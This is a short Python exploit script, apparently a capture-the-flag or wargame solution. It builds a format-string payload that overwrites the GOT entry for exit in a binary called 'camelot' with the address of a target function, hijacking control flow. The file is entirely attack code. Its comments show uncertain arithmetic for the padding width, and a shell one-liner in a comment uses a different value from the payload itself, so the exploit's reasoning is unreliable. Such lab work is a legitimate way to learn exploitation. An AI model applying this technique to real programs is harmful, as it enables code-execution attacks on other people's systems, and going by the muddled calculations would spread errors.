import struct
import sys

# Addresses
the_kingdom_is_yours_addr = 0x0804931f      # Address of the_kingdom_is_yours
got_exit_addr = 0x0804b384                  # GOT entry for exit
offset = 36                                 # Number of %x to reach the start of input
# 0x0804931f = 134517535 in decimal (the_kingdom_is_yours)
# 0x0804b384 = 134525828 in decimal (exit)

payload = b""

# $ camelot $(python3 -c 'print("\x84\xb3\x04\x08%134513915u%36$n")')
# Add into payload the got_exit_addr
payload += struct.pack("I", got_exit_addr)

# Add into payload a number in decimal that if added to the current number of characters printed 
# (got_exit_addr) will be equal to the address of the_kingdom_is_yours:
# 134525828 + x = 134517535 <=> x = -8293 (negative?)
# or maybe 134517535 - 4 = 134517531 (?)
payload += b"%134517531u"

# The 36th argument is the first input given, so the got_exit_addr will be overwritted 
# with everything that is printed before the 36th argument (the address of the_kingdom_is_yours)
payload += b"%36$n"

sys.stdout.buffer.write(payload)